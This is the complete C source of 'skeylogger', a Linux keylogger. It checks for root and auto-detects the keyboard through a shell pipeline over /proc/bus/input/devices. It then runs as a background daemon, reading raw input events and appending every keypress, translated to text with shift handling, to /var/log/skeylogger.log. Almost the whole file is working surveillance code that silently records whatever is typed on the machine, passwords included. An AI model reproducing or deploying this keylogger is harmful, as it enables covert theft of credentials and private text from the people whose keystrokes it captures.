#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <getopt.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <linux/input.h>
#include <assert.h>

#ifndef _UTIL_H_
#define _UTIL_H_

#define ASSERT_ON_COMPILE(expn) typedef char __C_ASSERT__[(expn) ? 1 : -1]
#define ARRAY_SIZE(arr) (sizeof(arr)/sizeof(arr[0]))
#define LOG(msg, ...) printf("LOG: " msg "\n", ##__VA_ARGS__)
#define LOG_ERROR(msg, ...) fprintf(stderr, "ERROR: " msg " (%s)\n", ##__VA_ARGS__, strerror(errno))

#endif

#ifndef _CONFIG_H_
#define _CONFIG_H_

typedef struct Config {
    char *logFile;
    char *deviceFile;
    bool logFileAllocated;
    bool deviceFileAllocated;
} Config;

void Config_cleanup(Config *config);

#endif

#ifndef _KEY_UTIL_H_
#define _KEY_UTIL_H_

#define UNKNOWN_KEY "\0"

bool isShift(uint16_t code);
char* getKeyText(uint16_t code, uint8_t shift_pressed);

#endif

#ifndef _OPTIONS_H_
#define _OPTIONS_H_

void parseOptions(int argc, char **argv, Config *config);
static char *getKeyboardDeviceFileName();

#endif

void Config_cleanup(Config *config) {
    if (config->logFileAllocated && config->logFile) {
        free(config->logFile);
        config->logFile = NULL;
    }
    if (config->deviceFileAllocated && config->deviceFile) {
        free(config->deviceFile);
        config->deviceFile = NULL;
    }
}

#define UK UNKNOWN_KEY

static char *key_names[] = {
    UK, "<ESC>",
    "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=",
    "<Backspace>", "<Tab>",
    "q", "w", "e", "r", "t", "y", "u", "i", "o", "p",
    "[", "]", "<Enter>", "<LCtrl>",
    "a", "s", "d", "f", "g", "h", "j", "k", "l", ";",
    "'", "`", "<LShift>",
    "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/",
    "<RShift>",
    "<KP*>",
    "<LAlt>", " ", "<CapsLock>",
    "<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>",
    "<NumLock>", "<ScrollLock>",
    "<KP7>", "<KP8>", "<KP9>",
    "<KP->",
    "<KP4>", "<KP5>", "<KP6>",
    "<KP+>",
    "<KP1>", "<KP2>", "<KP3>", "<KP0>",
    "<KP.>",
    UK, UK, UK,
    "<F11>", "<F12>",
    UK, UK, UK, UK, UK, UK, UK,
    "<KPEnter>", "<RCtrl>", "<KP/>", "<SysRq>", "<RAlt>", UK,
    "<Home>", "<Up>", "<PageUp>", "<Left>", "<Right>", "<End>", "<Down>",
    "<PageDown>", "<Insert>", "<Delete>"
};

static char *shift_key_names[] = {
    UK, "<ESC>",
    "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+",
    "<Backspace>", "<Tab>",
    "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P",
    "{", "}", "<Enter>", "<LCtrl>",
    "A", "S", "D", "F", "G", "H", "J", "K", "L", ":",
    "\"", "~", "<LShift>",
    "|", "Z", "X", "C", "V", "B", "N", "M", "<", ">", "?",
    "<RShift>",
    "<KP*>",
    "<LAlt>", " ", "<CapsLock>",
    "<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>",
    "<NumLock>", "<ScrollLock>",
    "<KP7>", "<KP8>", "<KP9>",
    "<KP->",
    "<KP4>", "<KP5>", "<KP6>",
    "<KP+>",
    "<KP1>", "<KP2>", "<KP3>", "<KP0>",
    "<KP.>",
    UK, UK, UK,
    "<F11>", "<F12>",
    UK, UK, UK, UK, UK, UK, UK,
    "<KPEnter>", "<RCtrl>", "<KP/>", "<SysRq>", "<RAlt>", UK,
    "<Home>", "<Up>", "<PageUp>", "<Left>", "<Right>", "<End>", "<Down>",
    "<PageDown>", "<Insert>", "<Delete>"
};
#undef UK

bool isShift(uint16_t code) {
    return code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT;
}

char *getKeyText(uint16_t code, uint8_t shift_pressed) {
    ASSERT_ON_COMPILE(ARRAY_SIZE(key_names) == ARRAY_SIZE(shift_key_names));
    char **arr = shift_pressed ? shift_key_names : key_names;
    size_t arr_size = ARRAY_SIZE(key_names);
    if (code < arr_size && arr[code] != NULL) {
        return arr[code];
    } else {
        return UNKNOWN_KEY;
    }
}

#define VERSION "0.1.0-singlefile"

static void printHelp() {
    printf("Usage: skeylogger [OPTION]\n"
           "Logs pressed keys to a file.\n\n"
           "  -h, --help\t\tDisplays this help message\n"
           "  -v, --version\t\tDisplays version information\n"
           "  -l, --logfile PATH\tPath to the logfile (Default: /var/log/skeylogger.log)\n"
           "  -d, --device PATH\tPath to keyboard device file (Default: auto-detected)\n");
}

static void printVersion() {
    printf("skeylogger version %s\n", VERSION);
}

static char *getKeyboardDeviceFileName() {
    static const char *command =
        "grep -E 'Handlers|EV=' /proc/bus/input/devices | "
        "grep -B1 'EV=120013' | "
        "grep -Eo 'event[0-9]+' | "
        "head -n1 | "
        "tr -d '\\n'";
    FILE *pipe = popen(command, "r");
    if (!pipe) {
        LOG_ERROR("Could not run command to find keyboard device: %s", command);
        return NULL;
    }

    char event_name[20];
    if (fgets(event_name, sizeof(event_name), pipe) == NULL) {
         if (feof(pipe)) {
             LOG_ERROR("No matching device found in /proc/bus/input/devices.", "");
         } else {
             LOG_ERROR("Failed reading output from command pipe", "");
         }
         pclose(pipe);
         return NULL;
    }

    pclose(pipe);

    char *full_path = malloc(strlen("/dev/input/") + strlen(event_name) + 1);
    if (!full_path) {
        LOG_ERROR("Memory allocation failed for device path", "");
        return NULL;
    }
    strcpy(full_path, "/dev/input/");
    strcat(full_path, event_name);

    return full_path;
}

void parseOptions(int argc, char **argv, Config *config) {
    config->logFile = "/var/log/skeylogger.log";
    config->deviceFile = getKeyboardDeviceFileName();
    config->logFileAllocated = false;
    config->deviceFileAllocated = (config->deviceFile != NULL);

    if (config->deviceFile == NULL) {
        LOG_ERROR("Failed to auto-detect keyboard device. Please specify with -d.", "");
        config->deviceFile = "/dev/input/event0";
        config->deviceFileAllocated = false;
        fprintf(stderr, "Warning: Falling back to default device %s.\n", config->deviceFile);
    } else {
         LOG("Auto-detected keyboard device: %s", config->deviceFile);
    }

    static const char short_opts[] = "hvl:d:";
    static struct option long_opts[] = {
        {"help",    no_argument,       0, 'h'},
        {"version", no_argument,       0, 'v'},
        {"logfile", required_argument, 0, 'l'},
        {"device",  required_argument, 0, 'd'},
        {0, 0, 0, 0}
    };

    int opt;
    while ((opt = getopt_long(argc, argv, short_opts, long_opts, NULL)) != -1) {
        switch (opt) {
            case 'h':
                printHelp();
                exit(EXIT_SUCCESS);
                break;
            case 'v':
                printVersion();
                exit(EXIT_SUCCESS);
                break;
            case 'l':
                if (config->logFileAllocated) free(config->logFile);
                config->logFile = strdup(optarg);
                if (!config->logFile) {
                    LOG_ERROR("Failed to allocate memory for log file path", "");
                    exit(EXIT_FAILURE);
                }
                config->logFileAllocated = true;
                break;
            case 'd':
                 if (config->deviceFileAllocated) free(config->deviceFile);
                config->deviceFile = strdup(optarg);
                 if (!config->deviceFile) {
                    LOG_ERROR("Failed to allocate memory for device file path", "");
                    exit(EXIT_FAILURE);
                }
                config->deviceFileAllocated = true;
                break;
            case '?':
                printHelp();
                exit(EXIT_FAILURE);
                break;
            default:
                abort();
        }
    }
}

#define KEY_RELEASE 0
#define KEY_PRESS   1
#define KEY_REPEAT  2

typedef struct input_event input_event;

static void rootCheck() {
    if (geteuid() != 0) {
        fprintf(stderr, "Error: This program must be run as root.\n");
        exit(EXIT_FAILURE);
    }
}

static int openKeyboardDeviceFile(const char *deviceFile) {
    int kbd_fd = open(deviceFile, O_RDONLY);
    if (kbd_fd == -1) {
        LOG_ERROR("Could not open keyboard device file '%s'", deviceFile);
    }
    return kbd_fd;
}

int main(int argc, char **argv) {
    rootCheck();

    Config config = {0};
    parseOptions(argc, argv, &config);

    LOG("Using device file: %s", config.deviceFile);
    LOG("Using log file: %s", config.logFile);

    int kbd_fd = openKeyboardDeviceFile(config.deviceFile);
    if (kbd_fd < 0) {
        Config_cleanup(&config);
        exit(EXIT_FAILURE);
    }

    FILE *logfile = fopen(config.logFile, "a");
    if (logfile == NULL) {
        LOG_ERROR("Could not open log file '%s'", config.logFile);
        close(kbd_fd);
        Config_cleanup(&config);
        exit(EXIT_FAILURE);
    }

    setbuf(logfile, NULL);

    LOG("Starting keylogger daemon...");
    if (daemon(1, 0) == -1) {
        LOG_ERROR("Failed to daemonize", "");
        fclose(logfile);
        close(kbd_fd);
        Config_cleanup(&config);
        exit(EXIT_FAILURE);
    }

    uint8_t shift_pressed_count = 0;
    input_event event;

    while (read(kbd_fd, &event, sizeof(input_event)) > 0) {
        if (event.type == EV_KEY) {
            if (isShift(event.code)) {
                if (event.value == KEY_PRESS || event.value == KEY_REPEAT) {
                    if (event.value == KEY_PRESS) shift_pressed_count++;
                } else if (event.value == KEY_RELEASE) {
                    if (shift_pressed_count > 0) shift_pressed_count--;
                }
            } else if (event.value == KEY_PRESS) {
                char *key_text = getKeyText(event.code, (shift_pressed_count > 0));
                if (key_text && strcmp(key_text, UNKNOWN_KEY) != 0) {
                    if (fputs(key_text, logfile) == EOF) {
                        break;
                    }
                }
            }
        }
         assert(shift_pressed_count <= 2 && shift_pressed_count >= 0);
    }

    LOG_ERROR("Exiting keylogger loop (read error or EOF)", "");
    fclose(logfile);
    close(kbd_fd);
    Config_cleanup(&config);

    return EXIT_FAILURE;
}